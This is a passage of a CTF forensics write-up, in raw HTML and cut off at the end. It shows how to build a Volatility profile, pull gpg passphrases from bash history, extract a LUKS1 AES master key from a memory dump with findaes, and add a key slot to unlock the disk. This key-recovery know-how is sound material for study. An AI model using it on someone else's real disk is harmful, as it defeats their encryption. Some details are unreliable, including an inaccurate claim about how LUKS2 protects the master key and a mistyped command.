data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9DcmF6eW1hbkFybXk=\">Author - Crazyman</span>\n          <p class=\"desc\">Crazyman Twitter Profile</p>\n          </div></div></div>\n<p>In this challenge we got a disk image &amp; a memory dump. The Description tell us that the user encrypted his disk and forgot the password! So we can understand that the memory dump will help us to decrypt the disk to get the flag! right?? Let’s Check what we have !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ file *</span><br><span class=\"line\">forensic.img: LUKS encrypted file, ver 1 [aes, ecb, sha1] UUID: 61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\">memory.raw:   data</span><br></pre></td></tr></table></figure>\n<p>As you see we have LUKS encrypted file version1! I will say it again! it’s verion 1!!!<br>\nOh wait what is LUKS??!</p>\n<p>LUKS or the Linux Unified Key Setup is a disk encryption specification created by Clemens Fruhwirth in 2004 and was originally intended for Linux.<br>\nWhile most disk encryption softwares implement different, incompatible, and undocumented formats, LUKS implements a platform-independent on-disk format for use in various tools. This not only faciliates compatibility and interoperability among different programs, but also assures that they all implement password management in a secure and documented manner. Per Wikipedia.</p>\n<p>Unlike most blogs say, you should stick with LUKS2 if you are applying it to your disk, since it provides an extra layer of security by storing the master key in the kernel directly. However LUKS1 masterkey gets loaded in the RAM when you try to unlock it, and that what we are going to grab from the memory dump!</p>\n<p>The encrypted master key is stored as plaintext in the LUKS header. However once we mount it and get prompted to enter a passphrase, at least one of eight (LUKS support up to 8 passphrases), the decrypted master key (AES) is loaded into the memory.</p>\n<p><img data-src=\"https://i.imgur.com/GOTSIPB.png\" alt=\"\"><br>\n<em>Image courtesy: MDPI</em></p>\n<p>When we tried to use <span class=\"exturl\" data-url=\"aHR0cDovL1ZvbGF0aWxpdHkucHk=\">Volatility.py</span> against the memory dump we had some troubles finding the right profile.</p>\n<p>We are sure that this memory image is linux one, because we have LUKS. Let’s figure out what is the distrubition and the version to search or make our volatility profile to work with!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.ram | grep <span class=\"string\">&quot;Linux version&quot;</span></span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Oh it’s <span class=\"pinky\">Ubuntu 16.04.4</span> with low-latency kernel! oh wait what? what did you mean by low-latency kernel?<br>\nAs I know there is various type of linux kernel like Real-tim kernel, generic kernel, Low-latency kernel<br>\nThis types of kernel varies in the type of the scheduler and their algorithm, as well as the system interuption… etc! None is better than the other! Each one has its use case.</p>\n<p>For example the low-latency one can reduce audio latency and the context switches are more frequent. This type of kernel has a scheduler that is not suitable for a server environment! But it will be good for a professional audio or video editing!</p>\n<p>Ok now i guess you get it ! It’s time to make our profile! In this demo we will make a volatility profile with low-latency kernel using docker container. It’s better than downloading a whole VM! Don’t waste time in that!</p>\n<p>Let’s download volatiltiy man</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ git <span class=\"built_in\">clone</span> https://github.com/volatilityfoundation/volatility</span><br><span class=\"line\">Cloning into <span class=\"string\">&#x27;volatility&#x27;</span>...</span><br><span class=\"line\">remote: Enumerating objects: 27411, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Cceiving objects:   7% (1919/27411), 340.01 KiB | 652.00 KiB/s</span><br></pre></td></tr></table></figure>\n<p>In Volatility repository there is  <code>/tools/linux</code>  directory that contains tools that allow us to make a linux profile. In this directory there is a file called <span class=\"pinky\">Makefile</span> that contains important information ! Let’s check it!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ <span class=\"built_in\">cat</span> Makefile</span><br><span class=\"line\">obj-m += module.o</span><br><span class=\"line\">KDIR ?= /</span><br><span class=\"line\">KVER ?= $(shell <span class=\"built_in\">uname</span> -r)</span><br><span class=\"line\"></span><br><span class=\"line\">-include version.mk</span><br><span class=\"line\"></span><br><span class=\"line\">all: dwarf</span><br><span class=\"line\"></span><br><span class=\"line\">dwarf: module.c</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> modules</span><br><span class=\"line\">        dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=<span class=\"string\">&quot;<span class=\"subst\">$(PWD)</span>&quot;</span> clean</span><br><span class=\"line\">        <span class=\"built_in\">rm</span> -f module.dwarf</span><br></pre></td></tr></table></figure>\n<p>Look at the  <code>KVER</code>  variable , it contains your current kernel version! it’s an automatic kernel detection! in our case we will change it with the version of kernel that we will use it! Check the Linux Version from the output of the last strings command that we runed on the memory dump.<br>\nchange  <code>$(shell uname -r)</code>  with  <code>4.4.0-72-lowlatency</code> . Do it manually or use the magic of  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>Sed Magic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ sed -i <span class=\"string\">&#x27;s/$(shell uname -r)/4.4.0-72-lowlatency/g&#x27;</span> Makefile</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to run a <span class=\"pinky\">Ubuntu 16.04.4</span> docker container and mount the current direcotry that contains the tools to build the profile. We can use the variable environment $PWD to indicate the current path easly. Don’t waste your time writing the whole path man !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --<span class=\"built_in\">rm</span> -v <span class=\"variable\">$PWD</span>:/volatility ubuntu:16.04 /bin/bash</span><br><span class=\"line\">Unable to find image <span class=\"string\">&#x27;ubuntu:16.04&#x27;</span> locally</span><br><span class=\"line\">16.04: Pulling from library/ubuntu</span><br><span class=\"line\">58690f9b18fc: Downloading [=========&gt;                                         ]  8.522MB/46.5MB</span><br><span class=\"line\">b51569e7c507: Download complete</span><br><span class=\"line\">da8ef40b9eca: Download complete</span><br></pre></td></tr></table></figure>\n<p>Just wait until the container is pulled &amp; get your bash !</p>\n<figure class=\"highlight bash\"><figcaption><span>The ubuntu container is ready</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Digest: sha256:91bd29a464fdabfcf44e29e1f2a5f213c6dfa750b6290e40dd6998ac79da3c41</span><br><span class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> ubuntu:16.04</span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>Since our ubuntu container is ready to use. Let’s install the low-latency kernel and the essentials packages for building the profile.</p>\n<figure class=\"highlight bash\"><figcaption><span>Install our packages</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># apt update &amp;&amp; apt install -y linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency build-essential dwarfdump make zip</span></span><br><span class=\"line\">Get:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [99.8 kB]</span><br><span class=\"line\">Get:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB]</span><br><span class=\"line\">Get:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [2051 kB]</span><br><span class=\"line\">Get:4 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [99.8 kB]</span><br><span class=\"line\">Get:5 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [97.4 kB]</span><br><span class=\"line\">Get:6 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB]</span><br><span class=\"line\">Get:7 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [15.9 kB]</span><br></pre></td></tr></table></figure>\n<p>Ah man you’ll wait again until the installation is done! After the installation is finished let’s check our volatility tools inside the container then make the profile !</p>\n<figure class=\"highlight bash\"><figcaption><span>Make The profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class=\"line\">boot  etc  initrd.img  lib64  mnt    proc  run   srv   tmp  var  volatility</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># cd volatility/</span></span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># ls</span></span><br><span class=\"line\">Makefile  Makefile.enterprise  kcore  module.c</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># make</span></span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;/volatility&quot;</span> modules</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CC [M]  /volatility/module.o</span><br><span class=\"line\">  Building modules, stage 2.</span><br><span class=\"line\">  MODPOST 1 modules</span><br><span class=\"line\">  CC      /volatility/module.mod.o</span><br><span class=\"line\">  LD [M]  /volatility/module.ko</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build M=<span class=\"string\">&quot;/volatility&quot;</span> clean</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CLEAN   /volatility/.tmp_versions</span><br><span class=\"line\">  CLEAN   /volatility/Module.symvers</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Now let’s zip the result of the make command (module.dwarf) and the system map file from the  <code>/boot</code>  :</p>\n<ul>\n<li>\n<p>The system map file contains the Symbols that will be used by volatility to run the plugin correctly. It list function entry points and addresses of kernel data structures of a particular build of a kernel!</p>\n</li>\n<li>\n<p>The  <code>module.dwarf</code>  contains the  <code>vtypes</code>  of this kernel module! To make we can call  <code>vtypes</code>  as the kernel’s data structures. To make it more easy  <code>vtypes</code>  is a small library to define  <code>Validating Types</code>  that will be used by the kernel !</p>\n</li>\n</ul>\n<p>Why we zip the  <code>module.dwarf</code>  and the  <code>System.map</code>  file? It’s simple man! These two files represent the whole profile that will be used by volatility! Volatility requires these 2 files to be in zip to deal with it as profile! Wow man, our profile is coming!</p>\n<p>zip Ubuntu1604.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</p>\n<figure class=\"highlight bash\"><figcaption><span>Zip the 2 files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># zip Ubuntu1604-low.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</span></span><br><span class=\"line\">  adding: module.dwarf (deflated 89%)</span><br><span class=\"line\">  adding: boot/System.map-4.4.0-72-lowlatency (deflated 79%)</span><br></pre></td></tr></table></figure>\n<p>Now just leave our ubuntu container. we finished the 1st step of the challenge and you learn how to make a cool &amp; custom linux profile! Now you can copy this zip file to  <code>/plugins/overlays/linux/</code>  directory in your volatility environment.</p>\n<p>Sanity Check please ! Let’s list all the ubuntu profiles available!</p>\n<figure class=\"highlight bash\"><figcaption><span>check the availability of the profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py --info | grep -i ubuntu </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">LinuxUbuntu1604-lowx64     - A Profile <span class=\"keyword\">for</span> Linux Ubuntu1604-low x64</span><br></pre></td></tr></table></figure>\n<p>Cool! we found our new profile recognized by volatility ! Now it’s time to try use it.</p>\n<figure class=\"highlight bash\"><figcaption><span>Test the new profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_banner    </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!! Our profile is ready to work! Let’s start the investigation now<br>\nI started checking the bash history!</p>\n<figure class=\"highlight bash\"><figcaption><span>Bash History</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_bash        </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Pid      Name       Command Time             Command</span><br><span class=\"line\">-------- ---------- -----------------------  -------</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get install linux-image-4.4.0-72-lowlatency linux-headers-lowlatency</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  reboot</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get insta</span><br><span class=\"line\">    1229 bash       2017-04-14 07:59:07 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:04:44 UTC  apt-get install lynx gnupg</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:54 UTC  nano /etc/fstab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:58 UTC  nano /etc/crypttab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:08 UTC  <span class=\"built_in\">cd</span> /mnt/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:29 UTC  <span class=\"built_in\">cp</span> -R /media/sf_DUMP/dir* .</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:38 UTC  ping 8.8.8.8</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:14 UTC  gpg --quick-gen-key <span class=\"string\">&#x27;Troll &lt;abuse@nothere.com&gt;&#x27;</span> rsa4096 cert 1y</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:49 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+porno+collection&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:27 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=1m_4n_4dul7_n0w -c findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:37 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+troll+memes&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:04 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=Troll_Tr0ll_TrOll -c end.zip</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:20 UTC  nano dir1/dic_fr_l33t.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:28 UTC  <span class=\"built_in\">rm</span> findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:35 UTC  <span class=\"built_in\">rm</span> -rf dir1/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:55 UTC  <span class=\"built_in\">dd</span> <span class=\"keyword\">if</span>=/dev/sdb of=/media/sf_DUMP/forensic.img bs=2048</span><br></pre></td></tr></table></figure>\n<p>Let’s analyse this history together to understand what is going on here!</p>\n<ul>\n<li>The user install low-latency kernel</li>\n<li>install lynx : a terminal-based web browser for all Linux distributions</li>\n<li>edit the /etc/fstab.</li>\n<li>edit /etc/crypttab</li>\n<li>copy the directories from media (it can be a flash) partition to  <code>/mnt/</code></li>\n<li>Check the connectivity by pinging the DNS server of google (I used to do the same test :3)</li>\n<li>generate a key with gpg using rsa4096. Something will be encrypted in the next commands! I am sure</li>\n<li>use lynx to search for porno password collection! mmm He want a premium account</li>\n<li>Encrypt  <code>findme.txt</code>  file using gpg !! This will generate an encrypted file  <code>findme.txt.gpg</code></li>\n<li>Search for troll password!</li>\n<li>Encrypt  <code>end.zip</code>  with gpg again! We have  <code>end.zip.gpg</code> , another encrypted file!</li>\n<li>edit a file text called  <code>dic_fr_l33t.txt</code></li>\n<li>remove  <code>findme.txt</code> . I guess we need to recover this file !</li>\n<li>remove the directory that contains the  <code>dic_fr_l33t.txt</code>  file</li>\n</ul>\n<blockquote>\n<p>/etc/fstab: is a configuration table designed to ease the burden of mounting and unmounting file systems to a machine. It is a set of rules used to control how different filesystems are treated each time they are introduced to a system</p>\n</blockquote>\n<blockquote>\n<p>The /etc/crypttab (encrypted device table) file is similar to the fstab file and contains a list of encrypted devices to be unlocked during system boot up. This file can be used for automatically mounting encrypted swap devices or secondary file systems.</p>\n</blockquote>\n<p>Ok the encrypted disk contains a  <code>end.zip.gpg</code>  and  <code>findme.text.gpg</code> . These 2 files are the key of the task! The flag is on these files! So we need to decrypt to disk and mount it!</p>\n<h2 id=\"decrypt-disk-and-mount-it\"><a class=\"markdownIt-Anchor\" href=\"#decrypt-disk-and-mount-it\">#</a> Decrypt Disk and MOUNT IT</h2>\n<p>Dealing with the disk we require  <code>cryptsetup</code>  --a tool to manage plain dm-crypt and LUKS encrypted volumes, to install it, use  <code>sudo apt install cryptsetup-bin</code> .</p>\n<p>Analyzing the disk image to understand what we need to next!</p>\n<p>command  <code>cryptsetup luksDump forensic.img</code>  will return some useful LUKS information:</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS INFO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LUKS header information <span class=\"keyword\">for</span> forensic.img</span><br><span class=\"line\"></span><br><span class=\"line\">Version:        1</span><br><span class=\"line\">Cipher name:    aes</span><br><span class=\"line\">Cipher mode:    ecb</span><br><span class=\"line\">Hash spec:      sha1</span><br><span class=\"line\">Payload offset: 2048</span><br><span class=\"line\">MK bits:        128</span><br><span class=\"line\">MK digest:      a0 0c 4d c4 4a 53 5c 00 0c c3 33 63 13 5b 2c 41 8e a3 3f a9</span><br><span class=\"line\">MK salt:        5e 84 10 01 a8 19 06 22 6a 7b 1b <span class=\"built_in\">df</span> 35 73 46 8e</span><br><span class=\"line\">                0e 7e f4 68 b0 97 38 81 cf 6d 99 7c 22 82 bd 06</span><br><span class=\"line\">MK iterations:  117625</span><br><span class=\"line\">UUID:           61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\"></span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">        Iterations:             507935</span><br><span class=\"line\">        Salt:                   68 5e 9a ef 39 26 3a 09 3a a2 57 fa b8 a4 d9 6b</span><br><span class=\"line\">                                65 81 49 63 d7 43 41 2a 0e 0a <span class=\"built_in\">cd</span> cb d7 94 ac 01</span><br><span class=\"line\">        Key material offset:    8</span><br><span class=\"line\">        AF stripes:             4000</span><br><span class=\"line\">Key Slot 1: DISABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>It is clear as day that once we have the master key --the one used to control the disk the way we want, we can add a key slot/passphrase.</p>\n<p>As said in the introduction, the master key must be loaded into the RAM, we know it is AES, so using  <code>findaes</code>  tool <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdHMvZmluZGFlcy8=\">here</span></p>\n<p>Then, extract the downloaded zip file<br>\n <code>unzip findaes*.zip</code> <br>\nCompile it<br>\n <code>cd findaes* ; make</code> <br>\nAnd run it against the memory dump<br>\n <code>./findaes memory.raw</code> <br>\nAnd you get this!</p>\n<figure class=\"highlight bash\"><figcaption><span>AES Finally !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Found AES-128 key schedule at offset 0xad9f450:</span><br><span class=\"line\">8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1</span><br></pre></td></tr></table></figure>\n<p>Going further is a routinuous disk encryption operation, with the masterkey in hand, we can generate a new passphrase say  <code>1234</code>  or  <code>p@ssw0rd</code>  for us to access the content.</p>\n<figure class=\"highlight bash\"><figcaption><span>MasterKey !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1&quot;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&quot; &quot;</span> | xxd -r -p  &gt; masterkey.key</span><br><span class=\"line\"></span><br><span class=\"line\">cryptsetup luksAddKey --master-key-file=masterkey.key forensic.img                               </span><br><span class=\"line\">Enter new passphrase <span class=\"keyword\">for</span> key slot:</span><br><span class=\"line\">Verify passphrase:</span><br></pre></td></tr></table></figure>\n<p>Let’s see if it is now placed as Key Slot 1!</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cryptsetup luksDump forensic.img | grep Key.Slot</span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">Key Slot 1: ENABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>All good!<br>\nNow, we mount it!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cryptosetup luksOpen forensic.img mydata</span><br><span class=\"line\">Enter passphrase for forensic.img: </span><br><span class=\"line\">mkdir ~/csaw</span><br><span class=\"line\">sudo mount /dev/mapper/mydata ~/csaw</span><br></pre></td></tr></table></figure>\n<p>Just fill in your new passphrase in the previous step, and you’ll have it!</p>\n<p>If you got some permission concern while trying to access the mount point, just switch to root!</p>\n<p>After decrypting the disk and mounting it! We find 2 directories!  <code>dir2</code>  and  <code>lost+found</code> . OK I can say skip &amp; ignore  <code>lost+found</code>  directory. The  <code>dir2</code>  is our target. Let’s get our flag man!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">ls</span> </span><br><span class=\"line\">end.png    findme.txt.gpg      readme.txt</span><br></pre></td></tr></table></figure>\n<p>Let’s check the readme.txt first, Just i am trying to be patient before attacking the  <code>findme.txt.gpg</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Check readme</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> readme.txt</span><br><span class=\"line\">Do you know GPG? So just <span class=\"keyword\">do</span> it to decipher!!!</span><br></pre></td></tr></table></figure>\n<p>Ah man! We know that! We need to decrypt the gpg files. But wait! where is the  <code>end.zip.gpg</code>  file!<br>\nOk it’s not important for me! I guess  <code>findme.txt.gpg</code>  is the flag! Let’s decipher it with  <code>gpg</code>  command line utility. Of course we will use  <code>1m_4n_4dul7_n0w</code>  password!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td 